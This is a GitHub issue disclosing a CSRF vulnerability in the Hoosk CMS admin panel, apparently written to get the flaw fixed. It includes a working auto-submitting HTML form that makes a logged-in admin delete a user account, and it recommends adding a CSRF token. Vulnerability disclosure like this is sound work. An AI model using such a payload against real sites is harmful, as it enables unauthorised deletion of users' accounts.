## Description

![@3072L](https://avatars.githubusercontent.com/u/23235220?u=7f5f6a65aa2ae086413b91e7c9e12c5f12b818e3&v=4&size=48)[3072L](https://github.com/3072L)opened [on Apr 12, 2020](https://github.com/havok89/Hoosk/issues/53#issue-598385822)

Hi,bro.I also find an csrf issue in admin page.

When attacker induce authenticated admin user to a malicious web page, any accounts can be deleted without admin user's intention.

how to reproduce the issue.

1. Login to admin page.(/admin)
2. Keep login and access the html it has following content

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://demo.hoosk.org/admin/users/delete/userid" method="POST">
      <input type="hidden" name="deleteid" value="userid" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

userid is very easy to guess.

3.And account userid = `userid` is delete without admin user's intention.

how to fix this issue.

set csrf token to protect delete function.
